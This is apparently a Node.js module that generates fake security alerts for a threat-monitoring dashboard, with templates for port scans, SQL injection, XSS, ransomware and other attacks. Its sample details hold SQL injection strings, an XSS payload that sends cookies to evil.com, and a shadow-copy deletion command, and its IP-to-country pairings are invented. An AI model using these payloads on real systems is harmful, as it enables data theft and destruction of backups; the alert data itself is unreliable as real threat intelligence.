const attackTypes = ['Port Scan', 'SQL Injection', 'Brute Force', 'DDoS', 'Malware', 'XSS', 'MITM', 'Ransomware'];

const geoSources = [
  { country: 'Russia',      ips: ['185.220.101.55', '45.141.215.100', '195.123.246.138', '91.108.4.0'] },
  { country: 'China',       ips: ['103.35.74.20',   '180.97.215.1',   '221.194.44.224',  '103.99.0.1'] },
  { country: 'USA',         ips: ['104.21.34.200',  '172.67.200.1',   '198.199.119.234', '107.174.0.10'] },
  { country: 'Germany',     ips: ['91.189.91.25',   '151.101.1.140',  '195.148.127.225'] },
  { country: 'Brazil',      ips: ['187.18.212.20',  '177.135.100.22', '179.184.50.13'] },
  { country: 'North Korea', ips: ['175.45.176.0',   '210.52.109.22'] },
  { country: 'Iran',        ips: ['5.61.28.0',      '82.99.195.100',  '185.130.104.148'] },
  { country: 'India',       ips: ['43.229.84.150',  '117.247.144.26', '180.151.100.45'] },
  { country: 'Ukraine',     ips: ['91.219.236.195', '185.220.103.7',  '185.100.87.30'] },
  { country: 'Netherlands', ips: ['185.220.101.20', '185.220.102.8',  '209.141.33.25'] },
];

const targetIPs = [
  '192.168.1.1', '10.0.0.1', '172.16.0.1',
  '192.168.10.50', '10.10.10.10', '192.168.100.254',
  '10.0.0.100', '172.16.1.50',
];

const templates = {
  'Port Scan': {
    titles:   ['Stealth SYN Port Sweep', 'UDP Port Scan Detected', 'Aggressive NMAP Scan', 'Network Reconnaissance Activity'],
    details:  ['Sequential SYN packets on 1024+ ports without ACK', 'UDP probe on 500+ ports', 'OS fingerprinting with NMAP timing T4', 'Half-open scan on target subnet'],
    severity: ['Low', 'Low', 'Medium', 'Medium'],
    ports:    [22, 23, 25, 80, 443, 3306, 5432, 8080, 8443],
    score:    [12, 18, 35, 40],
  },
  'SQL Injection': {
    titles:   ['SQL Injection Attempt', 'Blind SQL Injection Probe', 'Time-Based SQL Injection', 'UNION-Based SQL Injection'],
    details:  ["Payload: ' OR '1'='1'--", "Payload: 1'; WAITFOR DELAY '0:0:5'--", 'Payload: UNION SELECT NULL, version()--', "Payload: ' AND SLEEP(5)--"],
    severity: ['High', 'High', 'Critical', 'Critical'],
    ports:    [3306, 5432, 1433, 80, 443],
    score:    [72, 80, 91, 95],
  },
  'Brute Force': {
    titles:   ['SSH Brute Force Attack', 'RDP Credential Stuffing', 'HTTP Login Brute Force', 'FTP Brute Force Attempt'],
    details:  ['540 failed SSH logins in 2 minutes', '320 failed RDP attempts with known credential lists', '1200+ POST /login requests with different passwords', '180 failed FTP logins with rockyou.txt'],
    severity: ['Medium', 'High', 'High', 'Medium'],
    ports:    [22, 3389, 80, 21],
    score:    [52, 68, 74, 48],
  },
  'DDoS': {
    titles:   ['SYN Flood Attack', 'HTTP Flood (Layer 7)', 'UDP Amplification Attack', 'Slowloris DoS'],
    details:  ['18,000 SYN packets/sec from spoofed IPs', '85,000 HTTP GET requests/min to /api/search', 'DNS amplification: 130GB+ traffic incoming', 'Holding open 5000+ partial HTTP connections'],
    severity: ['High', 'High', 'Critical', 'High'],
    ports:    [80, 443, 53, 80],
    score:    [76, 83, 97, 70],
  },
  'Malware': {
    titles:   ['C2 Beacon Detected', 'Trojan Dropper Activity', 'Fileless Malware Execution', 'Cryptominer Injection'],
    details:  ['Outbound beacon to known C2 IP every 30s', 'PowerShell dropper executing base64 payload', 'In-memory shellcode execution without disk artifact', 'CPU spike: cryptomining process injected into svchost'],
    severity: ['High', 'Critical', 'Critical', 'High'],
    ports:    [443, 80, 4444, 8080],
    score:    [82, 94, 96, 78],
  },
  'XSS': {
    titles:   ['Reflected XSS Attempt', 'Stored XSS in Comment', 'DOM-Based XSS', 'XSS via File Upload'],
    details:  ['Payload: <script>fetch("evil.com/?c="+document.cookie)</script>', 'Malicious <img onerror> stored in post body', 'location.hash used to inject script via eval()', 'SVG file with embedded JavaScript uploaded'],
    severity: ['Medium', 'High', 'High', 'Medium'],
    ports:    [80, 443],
    score:    [46, 68, 64, 50],
  },
  'MITM': {
    titles:   ['ARP Cache Poisoning', 'SSL Stripping Attack', 'DNS Spoofing Detected', 'BGP Route Hijacking'],
    details:  ['Duplicate ARP replies observed from unauthorized MAC', 'HTTPS downgraded to HTTP by intercepting proxy', 'Forged DNS A records pointing to attacker IP', 'Foreign AS announcing our IP prefix without authorization'],
    severity: ['High', 'High', 'Critical', 'Critical'],
    ports:    [80, 443, 53, 179],
    score:    [76, 84, 92, 97],
  },
  'Ransomware': {
    titles:   ['Ransomware Deployment Detected', 'Mass File Encryption', 'Shadow Copy Deletion', 'Ransom Note Dropped'],
    details:  ['Known LockBit 3.0 signature detected in process memory', '14,000 file modifications/min — encrypting .docx .xlsx .pdf', 'vssadmin delete shadows /all /quiet executed', 'README_DECRYPT.txt created in 47 directories'],
    severity: ['Critical', 'Critical', 'Critical', 'Critical'],
    ports:    [445, 139, 443, 80],
    score:    [95, 97, 98, 96],
  },
};

const rand = (arr) => arr[Math.floor(Math.random() * arr.length)];

exports.generateAttack = (attackType) => {
  const type     = attackType && templates[attackType] ? attackType : rand(attackTypes);
  const tmpl     = templates[type];
  const idx      = Math.floor(Math.random() * tmpl.titles.length);
  const geo      = rand(geoSources);
  const scoreIdx = idx % tmpl.score.length;

  return {
    title:         tmpl.titles[idx],
    attackType:    type,
    severity:      tmpl.severity[idx % tmpl.severity.length],
    status:        'Open',
    sourceIP:      rand(geo.ips),
    targetIP:      rand(targetIPs),
    sourceCountry: geo.country,
    targetPort:    tmpl.ports[idx % tmpl.ports.length],
    threatScore:   Math.min(tmpl.score[scoreIdx] + Math.floor(Math.random() * 4), 100),
    details:       tmpl.details[idx],
    payload:       ['SQL Injection', 'XSS'].includes(type)
      ? tmpl.details[idx].replace('Payload: ', '')
      : null,
  };
};

exports.attackTypes = attackTypes;
